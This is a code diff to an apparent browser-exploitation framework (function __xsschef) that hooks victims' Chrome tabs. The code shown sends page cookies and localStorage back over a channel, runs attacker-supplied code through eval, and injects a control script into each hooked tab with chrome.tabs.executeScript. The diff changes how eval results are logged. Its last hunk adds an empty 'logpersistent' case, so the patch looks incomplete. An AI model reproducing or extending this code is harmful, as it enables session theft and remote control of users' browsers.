@@ -49,7 +49,8 @@ function __xsschef() {
                 __p.postMessage({cmd:'recvstuff', p: {'cookies':document.cookie, 'localStorage': localStorage}});
             break;
             case 'eval':
-                __p.postMessage({cmd:'recveval', p: eval(msg.p)});
+                // __p.postMessage({cmd:'recveval', p: eval(msg.p)});
+                __logEval(eval(msg.p));
             break;
         }
     }
@@ -126,6 +127,10 @@ function __xsschef() {
             backchannel.postMessage({'cmd':'log', 'p': [].slice.call(arguments)});
         }
     };
+    
+    var __logEval = function(obj) {
+        return log({type:"recveval",result:obj});
+    };
 
     var backchannel;
     var sheeps = {};
@@ -177,7 +182,7 @@ function __xsschef() {
 
         try {
             chrome.tabs.executeScript(tab.id, 
-                {'code': '(function(){var __p=chrome.extension.connect({name:"sheepchannel"});__p.onMessage.addListener('+sheepchannel_script.toString()+');})();'}
+                {'code': '(function(){console.log(window);window.__logEval=function(obj){__p.postMessage({cmd:"recveval", p:obj});};window.__p=chrome.extension.connect({name:"sheepchannel"});__p.onMessage.addListener('+sheepchannel_script.toString()+');})();'}
             );
         } catch(e) {
             delete sheeps[tab.id];
@@ -285,6 +290,8 @@ function __xsschef() {
                 case 'reportpersistent':
                     report_persistent();
                 break;
+                case 'logpersistent':
+                    
             }
         }
 
